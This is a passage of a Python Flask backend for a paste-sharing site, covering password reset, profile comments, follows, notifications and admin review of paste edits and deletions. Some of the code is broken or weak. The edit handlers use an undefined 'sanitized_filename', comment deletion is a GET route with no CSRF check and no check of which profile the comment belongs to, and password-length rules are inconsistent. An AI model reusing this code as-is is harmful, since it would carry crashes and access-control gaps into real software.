    expires_at = datetime.strptime(reset_data['expires_at'], '%d-%m-%Y %H:%M:%S')
    expires_at = UTC_TZ.localize(expires_at)
    now = datetime.now(UTC_TZ)
    
    if now > expires_at:
        return render_template('reset_password.html', error='Reset token has expired.')
    
    # Check if token has already been used
    if reset_data['used']:
        return render_template('reset_password.html', error='This reset token has already been used.')
    
    if request.method == 'POST':
        # Verify reCAPTCHA
        args = request.values
        captcha_response = args.get('g-recaptcha-response')
        captcha_secret_key = get_recaptcha_secret_key()
        captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
        captcha_data = {
            'secret': captcha_secret_key,
            'response': captcha_response
        }
        captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
        captcha_verification_result = captcha_verification_response.json()
        if not captcha_verification_result['success']:
            return render_template('reset_password.html', error='reCAPTCHA verification failed. Please try again.')

        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        
        if not password or len(password) < 6:
            return render_template('reset_password.html', error='Password must be at least 6 characters long.')
        
        if password != confirm_password:
            return render_template('reset_password.html', error='Passwords do not match.')
        
        # Update user's password
        hashed_password = generate_password_hash(password)
        cursor.execute("UPDATE users SET password = ? WHERE id = ?", (hashed_password, reset_data['user_id']))
        
        # Mark token as used
        cursor.execute("UPDATE password_reset_tokens SET used = TRUE WHERE token = ?", (token,))
        db.commit()
        
        # Invalidate all existing sessions for this user to force them to log in again
        invalidate_user_sessions(reset_data['username'])
        
        return render_template('reset_password.html', success='Password has been reset successfully!')
    
    return render_template('reset_password.html')

@app.route("/profile/<username>/add_comment", methods=["POST"])
def add_profile_comment(username):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if 'username' not in session:
        return redirect(url_for('login'))
    
    login = session.get('username')
    comment = request.form.get("comment")
    
    # Verify reCAPTCHA
    args = request.values
    captcha_response = args.get('g-recaptcha-response')
    
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    
    if not captcha_verification_result['success']:
        flash("reCAPTCHA verification failed. Please try again.", "error")
        return redirect(url_for('user', username=username))
    
    if not comment or len(comment.strip()) == 0:
        flash("Comment cannot be empty.", "error")
        return redirect(url_for('user', username=username))
    
    if len(comment) > 90:  # Limit comment length
        flash("Comment cannot be longer than 90 characters.", "error")
        return redirect(url_for('user', username=username))
    
    db = get_db()
    cursor = db.cursor()
    
    # Get the profile user's ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    profile_user = cursor.fetchone()
    
    if not profile_user:
        return redirect(url_for('index'))
    
    profile_user_id = profile_user[0]
    
    # Get commenter's ID and status
    cursor.execute("SELECT id, status FROM users WHERE username = ?", (login,))
    user_details = cursor.fetchone()
    
    if not user_details:
        flash("User not found.", "error")
        return redirect(url_for('user', username=username))
    
    commenter_user_id = user_details[0]
    user_status = user_details[1]

    # Check cooldown for regular users using session-based rate limiting
    if user_status in ['user', 'anonymous']:
        identifier = get_session_identifier()
        if not check_rate_limit(identifier, 'profile_comment', max_attempts=1, window_seconds=60):
            flash("Cooldown! Please wait 60 seconds between profile comments.", "error")
            return redirect(url_for('user', username=username))
    
    # Add the comment
    now = datetime.now(UTC_TZ)
    comment_date = now.strftime('%Y-%m-%d %H:%M:%S')
    
    cursor.execute("""
        INSERT INTO profile_comments (profile_user_id, commenter_user_id, comment, date)
        VALUES (?, ?, ?, ?)
    """, (profile_user_id, commenter_user_id, comment.strip(), comment_date))
    
    db.commit()
    
    # Create notification for the profile owner (unless they're commenting on their own profile)
    if login != username:
        create_notification(
            user_id=profile_user_id,
            notification_type='profile_comment',
            title='New Profile Comment',
            message=f'{login} commented on your profile',
            related_user_id=commenter_user_id
        )
    
    return redirect(url_for('user', username=username))


@app.route("/profile/<username>/delete_comment/<int:comment_id>")
def delete_profile_comment(username, comment_id):
    if 'username' not in session:
        return redirect(url_for('login'))
    
    login = session.get('username')
    db = get_db()
    cursor = db.cursor()
    
    # Get current user's ID and status
    cursor.execute("SELECT id, status FROM users WHERE username = ?", (login,))
    current_user = cursor.fetchone()
    
    if not current_user:
        flash("User not found.", "error")
        return redirect(url_for('user', username=username))
    
    current_user_id = current_user[0]
    user_status = current_user[1]
    
    # Get comment data including commenter's user ID
    cursor.execute("""
        SELECT pc.commenter_user_id, u.username as commenter_username 
        FROM profile_comments pc
        LEFT JOIN users u ON pc.commenter_user_id = u.id
        WHERE pc.id = ?
    """, (comment_id,))
    comment_data = cursor.fetchone()
    
    if not comment_data:
        return redirect(url_for('user', username=username))
    
    commenter_user_id = comment_data[0]
    commenter_username = comment_data[1]
    
    # Allow deletion only if user is the profile owner
    if login == username:
        cursor.execute("DELETE FROM profile_comments WHERE id = ?", (comment_id,))
        db.commit()
    else:
        flash("You do not have permission to delete this comment.", "error")
    
    return redirect(url_for('user', username=username))

@app.route('/follow/<username>', methods=['POST'])
def follow_user(username):
    if 'username' not in session:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'You must be logged in to follow users.'}), 401
        flash('You must be logged in to follow users.', 'error')
        return redirect(url_for('login'))
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.form.get('csrf_token') or request.headers.get('X-CSRFToken')
            validate_csrf(csrf_token)
        except Exception as e:
            if request.headers.get('Content-Type') == 'application/json':
                return jsonify({'success': False, 'error': 'CSRF token is missing or invalid.'}), 400
            return "Bad Request CSRF token is missing", 400
    
    follower_username = session['username']
    
    # Prevent self-following
    if follower_username == username:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'You cannot follow yourself.'}), 400
        flash('You cannot follow yourself.', 'error')
        return redirect(url_for('user', username=username))
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user IDs
    cursor.execute("SELECT id FROM users WHERE username = ?", (follower_username,))
    follower_user = cursor.fetchone()
    
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    following_user = cursor.fetchone()
    
    if not follower_user or not following_user:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'User not found.'}), 404
        flash('User not found.', 'error')
        return redirect(url_for('user', username=username))
    
    follower_id = follower_user[0]
    following_id = following_user[0]
    
    # Check if already following
    cursor.execute("SELECT id FROM follows WHERE follower_id = ? AND following_id = ?", (follower_id, following_id))
    existing_follow = cursor.fetchone()
    
    if existing_follow:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'You are already following this user.'}), 400
        flash('You are already following this user.', 'error')
    else:
        # Add follow relationship
        cursor.execute("INSERT INTO follows (follower_id, following_id, created_at) VALUES (?, ?, ?)", 
                      (follower_id, following_id, datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S')))
        db.commit()
        
        # Create notification for the user being followed
        create_notification(
            user_id=following_id,
            notification_type='follow',
            title='New Follower',
            message=f'{follower_username} started following you',
            related_user_id=follower_id
        )
        
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': True, 'message': f'You are now following {username}.'})
        flash(f'You are now following {username}.', 'success')
    
    return redirect(url_for('user', username=username))

@app.route('/unfollow/<username>', methods=['POST'])
def unfollow_user(username):
    if 'username' not in session:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'You must be logged in to unfollow users.'}), 401
        flash('You must be logged in to unfollow users.', 'error')
        return redirect(url_for('login'))
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.form.get('csrf_token') or request.headers.get('X-CSRFToken')
            validate_csrf(csrf_token)
        except Exception as e:
            if request.headers.get('Content-Type') == 'application/json':
                return jsonify({'success': False, 'error': 'CSRF token is missing or invalid.'}), 400
            return "Bad Request CSRF token is missing", 400
    
    follower_username = session['username']
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user IDs
    cursor.execute("SELECT id FROM users WHERE username = ?", (follower_username,))
    follower_user = cursor.fetchone()
    
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    following_user = cursor.fetchone()
    
    if not follower_user or not following_user:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({'success': False, 'error': 'User not found.'}), 404
        flash('User not found.', 'error')
        return redirect(url_for('user', username=username))
    
    follower_id = follower_user[0]
    following_id = following_user[0]
    
    # Remove follow relationship
    cursor.execute("DELETE FROM follows WHERE follower_id = ? AND following_id = ?", (follower_id, following_id))
    db.commit()
    
    if request.headers.get('Content-Type') == 'application/json':
        return jsonify({'success': True, 'message': f'You have unfollowed {username}.'})
    flash(f'You have unfollowed {username}.', 'success')
    return redirect(url_for('user', username=username))

@app.route('/followers/<username>')
def get_followers(username):
    db = get_db()
    cursor = db.cursor()
    
    # Get the user ID for the profile being viewed
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user_id = user[0]
    
    # Get followers with their usernames, statuses, and custom colors
    cursor.execute("""
        SELECT u.username, u.status, u.username_color, f.created_at
        FROM follows f
        JOIN users u ON f.follower_id = u.id
        WHERE f.following_id = ?
        ORDER BY f.created_at DESC
    """, (user_id,))
    
    followers = []
    for row in cursor.fetchall():
        followers.append({
            'username': row[0],
            'status': row[1],
            'username_color': row[2],
            'followed_at': row[3]
        })
    
    return jsonify({'followers': followers})

@app.route('/following/<username>')
def get_following(username):
    db = get_db()
    cursor = db.cursor()
    
    # Get the user ID for the profile being viewed
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user_id = user[0]
    
    # Get following with their usernames, statuses, and custom colors
    cursor.execute("""
        SELECT u.username, u.status, u.username_color, f.created_at
        FROM follows f
        JOIN users u ON f.following_id = u.id
        WHERE f.follower_id = ?
        ORDER BY f.created_at DESC
    """, (user_id,))
    
    following = []
    for row in cursor.fetchall():
        following.append({
            'username': row[0],
            'status': row[1],
            'username_color': row[2],
            'followed_at': row[3]
        })
    
    return jsonify({'following': following})

@app.route('/notifications')
def get_notifications():
    """Get notifications for the current user."""
    if 'username' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user_id = user[0]
    
    # Get unread notifications
    cursor.execute("""
        SELECT id, type, title, message, related_user_id, related_paste_id, created_at
        FROM notifications 
        WHERE user_id = ? AND read_at IS NULL
        ORDER BY created_at DESC
        LIMIT 50
    """, (user_id,))
    
    notifications = []
    for row in cursor.fetchall():
        notifications.append({
            'id': row[0],
            'type': row[1],
            'title': row[2],
            'message': row[3],
            'related_user_id': row[4],
            'related_paste_id': row[5],
            'created_at': row[6]
        })
    
    return jsonify({'notifications': notifications})

@app.route('/notifications/count')
def get_notification_count():
    """Get count of unread notifications for the current user."""
    if 'username' not in session:
        return jsonify({'count': 0})
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    if not user:
        return jsonify({'count': 0})
    
    user_id = user[0]
    
    # Count unread notifications
    cursor.execute("SELECT COUNT(*) FROM notifications WHERE user_id = ? AND read_at IS NULL", (user_id,))
    count = cursor.fetchone()[0]
    
    return jsonify({'count': count})



@app.route('/notifications/mark-read/<int:notification_id>', methods=['POST'])
def mark_notification_read(notification_id):
    """Mark a notification as read."""
    if 'username' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.form.get('csrf_token')
            if not csrf_token:
                return jsonify({'error': 'CSRF token is missing'}), 400
            validate_csrf(csrf_token)
        except Exception as e:
            return jsonify({'error': 'CSRF token is invalid'}), 400
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user_id = user[0]
    
    # Mark notification as read
    cursor.execute("""
        UPDATE notifications 
        SET read_at = ? 
        WHERE id = ? AND user_id = ?
    """, (datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S'), notification_id, user_id))
    db.commit()
    
    return jsonify({'success': True})

@app.route('/notifications/mark-read-all', methods=['POST'])
def mark_all_notifications_read():
    """Mark all notifications as read for the current user."""
    if 'username' not in session:
        return jsonify({'error': 'Not logged in'}), 400
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.form.get('csrf_token')
            if not csrf_token:
                return jsonify({'error': 'CSRF token is missing'}), 400
            validate_csrf(csrf_token)
        except Exception as e:
            return jsonify({'error': 'CSRF token is invalid'}), 400
    
    db = get_db()
    cursor = db.cursor()
    
    # Get user ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user_id = user[0]
    
    # Mark all notifications as read
    cursor.execute("""
        UPDATE notifications 
        SET read_at = ? 
        WHERE user_id = ? AND read_at IS NULL
    """, (datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S'), user_id))
    db.commit()
    
    return jsonify({'success': True})

@app.route('/admin/approve-delete/<paste_name>', methods=['POST'])
def approve_delete_paste(paste_name):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    db = get_db()
    cursor = db.cursor()
    username = session.get('username')
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    user_status = cursor.fetchone()
    if not user_status or user_status[0] not in ['root', 'admin', 'manager']:
        return redirect(url_for('admin_panel'))
    
    # Delete all related data in a transaction
    try:
        # Cascading deletion of all related data:
        # 1. Delete post views for this paste (uses url_name as pastname field)
        cursor.execute("DELETE FROM post_views WHERE pastname = ?", (paste_name,))
        
        # 2. Delete pending edit requests for this paste (uses paste_url_name field)
        cursor.execute("DELETE FROM pending_edits WHERE paste_url_name = ?", (paste_name,))
        
        # 3. Delete the paste record (this also deletes comments stored as JSON)
        cursor.execute("DELETE FROM pasts WHERE url_name = ?", (paste_name,))
        
        # Remove the file from disk
        sanitized_filename = sanitize_filename(paste_name)
        file_path = os.path.join(ANON_PASTES, sanitized_filename)
        try:
            os.remove(file_path)
        except:
            pass
        
        db.commit()
        
        # Log admin action
        log_admin_action(username, 'approve_flagged_paste', f'Approved deletion for paste: {paste_name} (with all related data)')
        
    except Exception as e:
        db.rollback()
        log_admin_action(username, 'approve_flagged_paste_error', f'Error deleting paste {paste_name}: {str(e)}')
        flash('Error deleting paste. Please try again.', 'error')
        return redirect(url_for('admin_panel'))
    
    return redirect(url_for('admin_panel'))

@app.route('/admin/deny-delete/<paste_name>', methods=['POST'])
def deny_delete_paste(paste_name):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    db = get_db()
    cursor = db.cursor()
    username = session.get('username')
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    user_status = cursor.fetchone()
    if not user_status or user_status[0] not in ['root', 'admin', 'manager']:
        return redirect(url_for('admin_panel'))
    
    # Mark the paste as not pending deletion
    try:
        cursor.execute("UPDATE pasts SET pending_deletion = 0, deletion_requested_by = NULL, deletion_requested_at = NULL, deletion_reason = NULL WHERE url_name = ?", (paste_name,))
        db.commit()
        # Log admin action
        log_admin_action(username, 'deny_flagged_paste', f'Denied deletion for paste: {paste_name}')
        flash('Paste deletion request denied successfully.', 'success')
    except Exception as e:
        db.rollback()
        log_admin_action(username, 'deny_flagged_paste_error', f'Error denying deletion for paste {paste_name}: {str(e)}')
        flash('Error denying paste deletion. Please try again.', 'error')
    
    return redirect(url_for('admin_panel'))


@app.route('/admin/approve-edit/<int:edit_id>', methods=['POST'])
def approve_edit_request(edit_id):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    db = get_db()
    cursor = db.cursor()
    username = session.get('username')
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    user_status = cursor.fetchone()
    if not user_status or user_status[0] not in ['root', 'admin', 'manager']:
        return redirect(url_for('admin_panel'))
    
    # Get the edit request
    cursor.execute("SELECT * FROM pending_edits WHERE id = ? AND status = 'pending'", (edit_id,))
    edit_request = cursor.fetchone()
    if not edit_request:
        flash('Edit request not found or already processed.', 'error')
        return redirect(url_for('admin_panel'))
    # Apply the edit
    paste_url_name = edit_request[1]
    new_content = edit_request[5]
    sanitized_filename = sanitize_filename(paste_url_name)
    filename_path = os.path.join(ANON_PASTES, sanitized_filename)
    try:
        with open(filename_path, "w", encoding="utf-8") as filec:
            filec.write(new_content)
    except Exception as e:
        flash(f'Error applying edit: {e}', 'error')
        return redirect(url_for('admin_panel'))
    # Update the edit request status
    current_time = datetime.now(UTC_TZ).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("""
        UPDATE pending_edits 
        SET status = 'approved', reviewed_by = ?, reviewed_at = ? 
        WHERE id = ?
    """, (username, current_time, edit_id))
    db.commit()
    # Log admin action
    log_admin_action(username, 'approve_edit', f'Approved edit request {edit_id} for paste: {edit_request[1]}')
    flash('Edit request approved and applied successfully.', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/admin/deny-edit/<int:edit_id>', methods=['POST'])
def deny_edit_request(edit_id):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    db = get_db()
    cursor = db.cursor()
    username = session.get('username')
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    user_status = cursor.fetchone()
    if not user_status or user_status[0] not in ['root', 'admin', 'manager']:
        return redirect(url_for('admin_panel'))
    
    # Get the edit request
    cursor.execute("SELECT * FROM pending_edits WHERE id = ? AND status = 'pending'", (edit_id,))
    edit_request = cursor.fetchone()
    if not edit_request:
        flash('Edit request not found or already processed.', 'error')
        return redirect(url_for('admin_panel'))
    # Update the edit request status
    current_time = datetime.now(UTC_TZ).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("""
        UPDATE pending_edits 
        SET status = 'denied', reviewed_by = ?, reviewed_at = ? 
        WHERE id = ?
    """, (username, current_time, edit_id))
    db.commit()
    # Log admin action
    log_admin_action(username, 'deny_edit', f'Denied edit request {edit_id} for paste: {edit_request[1]}')
    flash('Edit request denied successfully.', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/online_count')
def online_count_api():
    online_count = get_cached_online_count()
    return jsonify({'online_count': online_count})

@app.route("/post/<file>/raw")
def post_raw(file):
    cursor = conn.cursor()
    # Check if paste exists and get its data using url_name
    cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (file,))
    paste = cursor.fetchone()
    if not paste:
        return redirect(url_for('index'))
    
    # If paste is pending deletion, block access except for admin override
    if paste[10] if len(paste) > 10 else False:  # pending_deletion field
        # Allow admin override if ?admin_view=1 and user is admin/root
        if request.args.get('admin_view') == '1':
            username = session.get('username')
            cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
            user_status = cursor.fetchone()
            if user_status and user_status[0] in ['root', 'admin']:
                pass  # allow access
            else:
                return redirect(url_for('index'))
        else:
            return redirect(url_for('index'))

    # Read the file content from disk using sanitized filename
    sanitized_filename = sanitize_filename(file)
    filename_path = os.path.join(ANON_PASTES, sanitized_filename)
    
    try:
        with open(filename_path, "r", encoding="utf-8") as filec:
            file_content = filec.read()
    except FileNotFoundError:
        return redirect(url_for('index'))
    except Exception as e:
        return redirect(url_for('index'))

    # Return raw content with appropriate headers
    sanitized_for_header = sanitize_filename(file)
    response = Response(file_content, mimetype='text/plain')
    response.headers['Content-Disposition'] = f'inline; filename="{sanitized_for_header}.txt"'
    return response

@app.route("/post/<file>/edit")
def edit_paste(file):
    cursor = conn.cursor()
    username = session.get('username')
    
    if not username:
        return redirect(url_for('login'))
    
    # Check if paste exists and get its data
    cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (file,))
    paste = cursor.fetchone()
    if not paste:
        return redirect(url_for('index'))
    
    # Get current user's ID
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    if not user:
        return redirect(url_for('login'))
    
    # Only allow the paste owner to edit
    if paste[1] != user[0]:  # paste[1] is owner_id
        return redirect(url_for('post', file=file))
    
    # Read the file content
    filename_path = os.path.join(ANON_PASTES, sanitized_filename)
    
    try:
        with open(filename_path, "r", encoding="utf-8") as filec:
            file_content = filec.read()
    except FileNotFoundError:
        return redirect(url_for('index'))
    except Exception as e:
        return redirect(url_for('index'))
    
    return render_template(
        "edit_paste.html",
        filename=paste[2],  # pastname
        url_name=file,
        file_content=file_content,
        edit_reason="",
        username=username
    )

@app.route("/post/<file>/edit", methods=['POST'])
def edit_paste_submit(file):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    cursor = conn.cursor()
    username = session.get('username')
    
    if not username:
        return redirect(url_for('login'))
    
    # Check if paste exists and get its data
    cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (file,))
    paste = cursor.fetchone()
    if not paste:
        return redirect(url_for('index'))
    
    # Get current user's ID and status
    cursor.execute("SELECT id, status FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    if not user:
        return redirect(url_for('login'))
    
    user_id = user[0]
    user_status = user[1]
    
    # Only allow the paste owner to edit
    if paste[1] != user_id:  # paste[1] is owner_id
        return redirect(url_for('post', file=file))
    
    # Get form data
    args = request.values
    paste_content = args.get('pasteContent')
    edit_reason = args.get('editReason')

    # Verify reCAPTCHA
    captcha_response = request.form.get('g-recaptcha-response')
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    if not captcha_verification_result.get('success'):
        error_message = 'reCAPTCHA verification failed. Please try again.'
        return render_template("edit_paste.html", 
                             filename=paste[2], 
                             url_name=file, 
                             file_content=paste_content or "", 
                             edit_reason=edit_reason or "",
                             username=username, 
                             error=error_message)
    
    # Validate content
    if not paste_content or len(paste_content) < 10 or len(paste_content) > 500000:
        error_message = "Content must be between 10 and 500,000 characters."
        return render_template("edit_paste.html", 
                             filename=paste[2], 
                             url_name=file, 
                             file_content=paste_content or "", 
                             edit_reason=edit_reason or "",
                             username=username, 
                             error=error_message)
    
    # Validate edit reason
    if not edit_reason or len(edit_reason.strip()) < 5 or len(edit_reason) > 500:
        error_message = "Please provide a reason for your edit (5-500 characters)."
        return render_template("edit_paste.html", 
                             filename=paste[2], 
                             url_name=file, 
                             file_content=paste_content or "", 
                             edit_reason=edit_reason or "",
                             username=username, 
                             error=error_message)
    
    # Normalize newlines
    paste_content = paste_content.replace('\r\n', '\n').replace('\r', '\n')
    
    # Read the original content for comparison
    filename_path = os.path.join(ANON_PASTES, sanitized_filename)
    
    try:
        with open(filename_path, "r", encoding="utf-8") as filec:
            original_content = filec.read()
    except FileNotFoundError:
        return redirect(url_for('index'))
    except Exception as e:
        return redirect(url_for('index'))
    
    # Check if content actually changed
    if paste_content == original_content:
        return redirect(url_for('post', file=file))
    
    # If user has "user" status, require approval
    if user_status == 'user':
        # Store the edit request in pending_edits table
        current_time = datetime.now(UTC_TZ).strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("""
            INSERT INTO pending_edits (paste_url_name, editor_id, editor_username, original_content, new_content, edit_reason, requested_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (file, user_id, username, original_content, paste_content, edit_reason, current_time))
        conn.commit()
        
        # Get the edit request ID for notifications
        cursor.execute("SELECT id FROM pending_edits WHERE paste_url_name = ? AND editor_id = ? AND requested_at = ?", (file, user_id, current_time))
        edit_request = cursor.fetchone()
        edit_request_id = edit_request[0] if edit_request else None
        
        # Get paste information for notifications
        cursor.execute("SELECT pastname, id FROM pasts WHERE url_name = ?", (file,))
        paste_info = cursor.fetchone()
        paste_title = paste_info[0] if paste_info else file
        paste_id = paste_info[1] if paste_info else None
        
        # Notify all staff members (manager, admin, founder) about the pending edit request
        staff_roles = ['manager', 'admin', 'root']
        cursor.execute("SELECT id FROM users WHERE status IN (?, ?, ?)", staff_roles)
        staff_members = cursor.fetchall()
        
        for staff_member in staff_members:
            staff_id = staff_member[0]
            # Don't notify the person who requested the edit
            if staff_id != user_id:
                create_notification(
                    user_id=staff_id,
                    notification_type='edit_request',
                    title='Edit Request Pending',
                    message=f'{username} requested to edit paste "{paste_title}"',
                    related_user_id=user_id,
                    related_paste_id=paste_id
                )
        
        # Log admin action
        log_admin_action(username, 'request_edit_approval', f'Requested edit approval for paste: {file}')
        
        return render_template("edit_paste.html", 
                             filename=paste[2], 
                             url_name=file, 
                             file_content=paste_content, 
                             username=username, 
                             message="Your edit has been submitted for approval. You will be notified when it's reviewed.")
    
    # For non-user status (admin users), apply the edit immediately
    try:
        with open(filename_path, "w", encoding="utf-8") as filec:
            filec.write(paste_content)
    except Exception as e:
        error_message = f"Error saving file: {e}"
        return render_template("edit_paste.html", 
                             filename=paste[2], 
                             url_name=file, 
                             file_content=paste_content, 
                             username=username, 
                             error=error_message)
    
    # Log admin action
    log_admin_action(username, 'edit_paste', f'Edited paste: {file}')
    
    return redirect(url_for('post', file=file))

# Security: Input validation functions
def validate_username(username):
    """Validate username for security and consistency"""
    if not username:
        return False, "Username is required"
    
    if len(username) < 2 or len(username) > 16:
        return False, "Username must be between 2 and 16 characters"
    
    # Only allow alphanumeric characters
    if not re.match(r'^[a-zA-Z0-9]+$', username):
        return False, "Username can only contain letters and numbers"
    
    # Prevent common attack usernames
    blocked_usernames = ['root', 'administrator', 'system', 'null', 'undefined', 'test', 'anonymous']
    if username.lower() in blocked_usernames:
        return False, "Username is not allowed"
    
    return True, ""

def validate_password(password):
    """Validate password strength"""
    if not password:
        return False, "Password is required"
    
    if len(password) < 8:
        return False, "Password must be at least 8 characters long"
    
    if len(password) > 128:
        return False, "Password is too long"
    
    # Check for common weak passwords
    weak_passwords = ['password', '123456', 'qwerty', 'admin', 'letmein']
    if password.lower() in weak_passwords:
        return False, "Password is too common"
    
    return True, ""

def validate_email(email):
    """Validate email format"""
    if not email:
        return True, ""  # Email is optional
    
    if len(email) > 254:  # RFC 5321 limit
        return False, "Email is too long"
    
    # Basic email validation
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_pattern, email):
        return False, "Invalid email format"
    
    return True, ""

@app.context_processor
def inject_recaptcha_site_key():
    return dict(
        RECAPTCHA_SITE_KEY=app.config['RECAPTCHA_SITE_KEY'],
        get_username_color=get_username_color
    )

@app.context_processor
def inject_user_status():
    status = None
    username = None
    if 'username' in session:
        username = session['username']
        try:
            db = get_db()
            db.row_factory = sqlite3.Row
            cursor = db.cursor()
            cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
            user_row = cursor.fetchone()
            if user_row:
                status = user_row['status']
        except Exception as e:
            print(f"Error fetching user status: {e}")
            # This might happen if the db connection is closed, let's try to reopen it.
            g._database = sqlite3.connect(DATABASE)
            db = get_db()
            db.row_factory = sqlite3.Row
            cursor = db.cursor()
            cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
            user_row = cursor.fetchone()
            if user_row:
                status = user_row['status']

    return dict(user_status=status, session_username=username, get_username_change_limit=get_username_change_limit)

@app.route('/users/<username>')
def users_profile(username):
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    # Case-insensitive lookup
    cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (username,))
    user_data = cursor.fetchone()
    if user_data:
        canonical_username = user_data['username']
        # Redirect to canonical username if case does not match
        if username != canonical_username:
            return redirect(url_for('users_profile', username=canonical_username), code=301)
        # Reuse the /user/<username> logic by redirecting
        return redirect(url_for('user', username=canonical_username), code=302)
    else:
        # User not found - redirect to users page
        return redirect(url_for('users'))

@app.route('/admin/assign-status', methods=['POST'])
def assign_status():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if not check_root_admin_access():
        flash('Access denied. Only root, admin, and manager users can assign roles.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Get current user's status
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    cursor.execute("SELECT status FROM users WHERE username = ?", (session['username'],))
    current_user = cursor.fetchone()
    current_user_status = current_user['status'] if current_user else None
    
